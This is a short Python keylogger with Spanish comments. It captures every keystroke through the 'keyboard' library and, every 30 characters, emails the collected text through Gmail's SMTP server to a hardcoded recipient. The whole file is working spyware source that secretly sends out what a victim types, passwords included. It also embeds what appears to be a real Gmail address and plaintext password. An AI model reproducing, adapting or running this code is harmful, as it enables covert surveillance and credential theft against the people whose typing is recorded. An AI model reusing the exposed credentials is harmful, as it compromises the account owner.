import keyboard as key #esta libreria es la que registra los eventos del teclado

from email.mime.multipart import MIMEMultipart 
from email.mime.text import MIMEText
import smtplib

import datetime

teclas = "" #esta variable guardará las teclas que se opriman 
#registro=open('keylogger.txt', 'w')
while True: #dentro de este buble se registran los eventos del teclado
    Recorded = str(key.read_event()) #esta es una funcion de la libreria kyboard para registrat los eventos
    #usaremos un condicional para evitar tener caracteres repetidos, cogeremos las teclas cunado se han dejado de presionar o sea up
    if Recorded.__contains__('up'):
        Recorded = Recorded.replace('KeyboardEvent(','') #especificamos el evento, en este caso es el read 
        Recorded = Recorded.replace('up)','') #especifica el tipo de accion que se ejecuta, cuando dejamos de oprimir la tecla
    #hay que formar bien las palabras que se han escrito, en un bucle if verificaremos que la tecla presionada tiene una len>1
    #por ejemplo con letras como space shift, pondremos espacios en estos casos 
        if (len(Recorded)>1):
            teclas = teclas + " " + Recorded + " "
            
    #cuando No sea un espacio o otra tecla especial formaremos la palabra uniendo las letras sin más
        else:
            teclas = teclas + Recorded
    print(teclas)
    
    if (len(teclas)>=30):
        try:
            msg = MIMEMultipart()

            password = "roma00josue23"
            msg['From'] = "josuevahe@gmail.com"
            msg['To'] = "a19osmvalval@inspedralbes.cat"
            msg['Subject'] = "Report" + str(datetime.datetime.now().date())

            msg.attach(MIMEText(teclas, 'plain'))

            server = smtplib.SMTP('smtp.gmail.com: 587')
            server.starttls()

            server.login(msg['From'], password)

            server.sendmail(msg['From'], msg['To'], msg.as_string())

            server.quit()
            teclas=""
        except:
            print("Error")
